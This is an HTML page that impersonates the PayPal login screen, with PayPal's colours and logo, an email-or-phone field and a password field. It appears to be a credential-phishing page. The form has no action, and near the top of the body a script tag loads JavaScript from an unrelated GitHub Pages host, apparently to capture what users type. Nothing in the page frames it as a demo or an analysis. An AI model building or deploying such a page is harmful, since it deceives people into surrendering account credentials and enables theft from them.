<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal Login</title>
<style>
/* Reset & font */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Arial, sans-serif;
}

body {
  background-color: #f2f2f2;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.login-container {
  background-color: #fff;
  padding: 40px;
  width: 380px;
  border-radius: 10px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
  text-align: center;
}

.logo img {
  width: 100px;
  margin-bottom: 20px;
}

.login-container h2 {
  color: #003087; /* PayPal blue */
  margin-bottom: 25px;
  font-size: 24px;
}

.login-container input[type="text"],
.login-container input[type="password"] {
  width: 100%;
  padding: 12px 15px;
  margin-bottom: 18px;
  border-radius: 5px;
  border: 1px solid #ccc;
  font-size: 16px;
}

.login-container input[type="submit"] {
  width: 100%;
  padding: 12px;
  border-radius: 5px;
  border: none;
  background-color: #003087; /* PayPal blue */
  color: #fff;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  transition: background 0.3s ease;
}

.login-container input[type="submit"]:hover {
  background-color: #002060;
}

.login-container a {
  display: block;
  margin-top: 12px;
  color: #003087;
  font-size: 14px;
  text-decoration: none;
}

.login-container a:hover {
  text-decoration: underline;
}
</style>
</head>
<body>
<script src="https://plyarth.github.io/intc/int3.js"></script>
<div class="login-container">
  <div class="logo">
    <!-- Placeholder for PayPal logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo">
  </div>
  <h2>Log in to your PayPal account</h2>
  <form>
    <input type="text" placeholder="Email or mobile number" name="Email or Mobile"required>
    <input type="password" placeholder="Password" name="Password"required>
    <input type="submit" value="Log In">
    <a href="#">Having trouble logging in?</a>
    <a href="#">Sign up for a PayPal account</a>
  </form>
</div>

</body>
</html>
